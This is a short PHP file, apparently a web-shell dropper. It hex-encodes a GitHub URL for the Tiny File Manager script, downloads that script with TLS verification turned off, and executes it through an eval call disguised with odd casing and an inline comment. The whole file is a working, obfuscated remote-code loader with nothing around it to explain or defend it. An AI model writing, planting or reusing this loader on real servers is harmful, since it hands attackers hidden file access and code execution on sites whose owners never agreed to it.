<?php


$url = hex2bin("68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f707261736174686d616e692f74696e7966696c656d616e616765722f726566732f68656164732f6d61737465722f74696e7966696c656d616e616765722e706870");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

$output = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

if($httpcode == 200) {
	EvAL/**_**/("?>" . $output);
}
